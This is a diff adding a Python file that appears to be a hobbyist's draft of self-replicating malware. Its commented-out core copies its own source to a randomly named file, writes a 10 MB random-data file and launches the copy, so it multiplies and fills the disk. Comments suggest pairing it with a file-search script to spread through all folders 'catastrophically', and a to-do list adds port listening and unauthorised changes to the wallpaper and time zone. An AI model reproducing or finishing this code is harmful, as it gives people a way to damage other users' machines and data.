@@ -1,0 +1,42 @@
+from sys import argv
+import subprocess
+
+import ctypes
+#ctypes is background related, make sure to import 
+
+#-------------------------------------------------------------
+#I = open(__file__).read()
+#import random,subprocess,os
+#NAME = str(random.randint(1,1000000))
+#with open(NAME+'.py','w') as f: # our new pyhton file
+#    f.write(I)
+#with open(NAME,'wb') as big_file: # our 10Mb file
+#    big_file.write(os.urandom(10240000))
+#mfile = '{}.py'.format(NAME)
+
+#process1 = subprocess.Popen(["python", mfile], shell = False)
+#-------------------------------------------------------------
+# 1) to stop the program, just press ctrl + c in the cmd.
+
+# 3) to potentiall make this more dangerous, use this code with my "File search in python" code.
+# the result could be catastrophic.imagine a program that spreads seeds of
+# a self replicating code, across all your folders and directories.
+#--------------------------------------------------------------------------------------------------------------------------------
+#DONT RUN, DIESECT AND RE-STITCH.
+#TASKs, TO-DO 
+#1. Background Change 
+#2. Time-Zone
+#3. Port Listening 
+#4. Desktop Confirmation Receipt -> That it worked
+#------------------------------------------------------------------------------------------------
+#---------->CODE FOR BACKGROUND CHANGE ON WINDOWS USE THIS FOR TEST PHASE<---------------
+#
+#
+#
+# class Main: 
+#    def __init__(self): 
+#        path = 'path/to/wallpaper/'
+#         ctypes.windll.user32.SystemParametersInfoW(20,0,path,0)
+#application = Main();
+#----------------------------------------------------------------------------------------------
+#other code block to put 
